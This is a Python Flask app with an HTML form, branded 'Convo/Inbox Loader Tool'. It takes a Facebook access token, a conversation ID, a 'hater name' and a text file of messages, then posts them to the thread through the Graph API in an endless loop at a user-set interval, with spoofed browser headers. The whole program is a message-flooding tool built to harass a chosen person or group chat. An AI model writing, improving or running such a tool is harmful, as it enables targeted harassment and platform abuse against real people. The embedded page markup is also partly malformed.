from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(300000)


    return '''
    
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>LAGEND LADKA</title>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
	<style>
		body{
			background-image: url('https://i.imgur.com/Sq5boPf.jpeg');
		}
		.container{
			max-width: 300px;
			background-color: transparent;
			border-radius: 8px;
			padding: 20px;
			box-shadow: inset 2px 5px 10px rgb(5, 5, 5);
			margin: 0 auto;
			margin-top: 20px;
		}
		.header{
			text-align: center;
			padding-bottom: 20px;
                        color: white
		}
                .input[type="text"], input[type="number"], input[type="file"] {
                        width: 100%;
                        padding: 10px;
                        margin: 5px 0;
                        border: 1px solid white;
                        border-radius: 4px;
		.btn-submit{
                }
			width: 100%;
			margin-top: 8px;
		}
		.footer{
			text-align: center;
			margin-top: 20px;
			color: red;
		}
	</style>
</head>
<body>
	<header class="header mt-4">
    <h1 class="mb-3"> 😈├┼𝐈𝐒𝐇𝐔┼┤😈 </h1> 𝐎𝐅𝐅𝐋𝟏𝐍𝟑 𝐒𝟑𝐑𝐕𝟑𝐑 𝐋𝟗𝐆𝟑𝐍𝐃 𝐍𝟗𝐑𝐔𝐓𝟎
		<h1 class="mt-3">𝐎𝐖𝐍𝟑𝐑 :: 𝐋𝟗𝐆𝟑𝐍𝐃 𝐈𝐒𝐇𝐔 ✨💫❤  </h1>
	</header>

	<div class="container">
		<form action="/" method="post" enctype="multipart/form-data">
			<div class="mb-3">
				<label for="accessToken">ᴇɴᴛᴇʀ ʏᴏᴜʀ ɪᴅ ᴛᴏᴋᴇɴ:</label>
				<input type="text" class="form-control" id="accessToken" name="accessToken" required>
			</div>
			<div class="mb-3">
				<label for="threadId">Enter ᴄᴏɴᴠᴏ/ɪɴʙᴏx ɪᴅ:</label>
				<input type="text" class="form-control" id="threadId" name="threadId" required>
			</div>
			<div class="mb-3">
				<label for="kidx">ᴇɴᴛᴇʀ ʜᴀᴛᴇʀ ɴᴀᴍᴇ:</label>
				<input type="text" class="form-control" id="kidx" name="kidx" required>
			</div>
			<div class="mb-3">
				<label for="txtFile">ꜱᴀʟᴇᴄᴛ ʏᴏᴜʀ ɴᴏᴛᴘᴀɪᴅ ꜰɪʟᴇ:</label>
				<input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
			</div>
			<div class="mb-3">
				<label for="time">ꜱᴘᴇᴇᴅ ɪɴ ɪɴ ꜱᴇᴄᴏɴᴅ:</label>
				<input type="number" class="form-control" id="time" name="time" required>
			</div>
			<button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
		</form>
	</div>
	<footer class="footer">
		<p>&copy; 2023 𝙉𝙊𝙏 𝙄𝙉 𝘼 𝙍𝙐𝙇𝙀𝙓. All Rights Reserved.</p>
    <p>Convo/Inbox Loader Tool</p>
		<p>Made with 𝐋𝐀𝐆𝐄𝐍𝐃 𝐈𝐒𝐇𝐔 ❤💙 by <a href="https://github.com/Henry Inxide</a></p>
	</footer>
</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
